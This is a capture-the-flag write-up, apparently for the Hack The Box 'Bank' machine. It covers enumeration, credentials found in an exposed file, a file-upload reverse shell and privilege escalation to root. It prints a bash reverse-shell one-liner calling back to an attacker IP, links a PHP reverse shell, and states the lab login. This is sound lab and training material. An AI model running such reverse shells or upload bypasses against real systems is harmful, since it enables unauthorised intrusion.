1. Run nmap to discover some open ports and services from the web server. Unfortunately, It doesn't work :(
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/444b5f7e-77a0-4fa8-9436-7f7362b919da)

2. Let's move to the next step, I try to input the ip address and it refers to domain bank.htb. Add to **/etc/hosts/** so I can open the website.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/3a8d03ce-6644-4a77-b25a-62a37f81fe5e)

Website:<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/4d75ea1a-0ee0-4043-ab12-1c4723a417d8)

3. I try to discover some paths with Feroxbuster and found nothing interesting.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/56060574-586b-49e9-8c89-11767235897c)

4. Next, I use Gobuster to helps me for checking the paths.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/983c2b5d-6a77-42e9-9212-9432426c9f91)

5. After waiting for a hour (I don't know why my Gobuster is running slowly), I discover an interesting path named balance-transfer which contains some files that been encrypted before. 
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/9a5fd218-6ba1-43a9-bf26-197780120082)

6. Checking one by one the file configuration and found there is one file that has a very small size.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/16f79c16-d0b8-4b3b-9ca4-1fe5490f989b)

7. Try to open it and discover that there is email and password inside the file. Let's login with the credentials!
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/80db165b-156a-4cda-9a1c-44d05e9b3af2)

**Email**: chris@bank.htb<br>
**Password**: !##HTBB4nkP4ssw0rd!##<br>

After Login:<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/2b1071fd-84a8-462b-bb0f-950a338d076e)

8. There are only 2 features inside (Dashboard and Support). In dashboard, I found nothing important information so I try to check Support Feature.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/398599ce-83cd-4721-8f86-349407801036)

9. There are 3 inputs inside and one of them is file uploading. When I checked the source code, there is no validation related to file extension.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/0d186ff2-f5d8-4718-a7b9-eaa3b7333197)

10. I realize that I can write payload inside a file and do reverse shell from this [link](https://www.revshells.com/). The file itself must be .htb extension to be accepted.

Payload: bash -c "bash -i >& /dev/tcp/10.10.14.4/777 0>&1"

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/df5e05a6-8f8b-49a2-bc83-d7fda57735e2)

11. When I opened the file, the payload didn't work.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/865f91da-ae43-45ac-ba0d-9f677021eacc)

12. I try upload another file with payload from [Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and it works.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/3d6dcad6-9316-42b1-801c-dbe28eec3b6f)

Attacker Terminal:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/0daeeb3d-7d38-4245-959a-73d22dd26409)

13. The flag is located in user.txt
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/055453f7-3cd0-497c-bf68-bae88abdb754)

14. Now I want to find the root flag and not suprisingly, I can't use sudo privileges.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1148f8d8-0b9a-464f-9ec9-40a9775df200)

15. Can't insert any external payload so the one solutions is find a interesting file to use. Luckily, there is a payload inside /var/emergency to escalate privilege.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1dd2ddf5-490c-4469-a2cf-4c61ec741f3a)

16. Just run with python and yes, I get the root privilege.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/c322a01f-6674-4bb9-ac4c-79bd6ffeb533)

17. The root flag is located in /root/root.txt.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/19aa24e4-402d-4972-a8ab-d179156fccab)




































